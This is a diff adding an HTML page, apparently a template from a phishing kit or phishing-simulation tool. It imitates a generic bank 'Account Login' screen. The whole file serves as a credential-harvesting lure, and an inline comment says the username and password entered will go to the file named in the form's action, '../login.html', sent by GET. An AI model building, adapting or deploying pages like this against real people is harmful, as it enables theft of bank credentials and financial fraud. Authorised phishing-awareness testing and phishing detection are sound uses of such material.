@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign with your Bank account</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign with your Bank account" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="bank.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <section class="bank-wrap">
+
+      <!-- form center container -->
+      <main class="bank-container">
+
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="bank-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Bank" />
+
+          <!-- form logo -->
+          <div class="bank-logo">
+            <img src="bank-logo.png" alt="Bank" />
+            <h1>Account Login</h1>
+          </div>
+
+          <!-- username input -->
+          <div class="bank-input bank-username">
+            <input type="text" id="_username" name="_username" value="" />
+            <label for="_username">Login ID or Email</label>
+          </div>
+
+          <!-- hidden password input -->
+          <div class="bank-input bank-password">
+            <input type="password" id="_password" name="_password" value="" />
+            <label for="_password">Password</label>
+          </div>
+
+          <!-- form action button -->
+          <div class="bank-action">
+            <button type="submit">Sign in</button>
+          </div>
+
+          <!-- form forgot link -->
+          <div class="bank-signup">
+            <a href="#">Forgot your ID or Password?</a> <br />
+            <a href="#">Open a New Account</a>
+          </div>
+
+        </form>
+
+      </main>
+
+    </section>
+
+    <!-- form footer links -->
+    <footer class="bank-footer">
+      <div class="bank-footer-container">
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Locations</a>
+      </div>
+    </footer>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="bank.js"></script>
+
+  </body>
+</html>
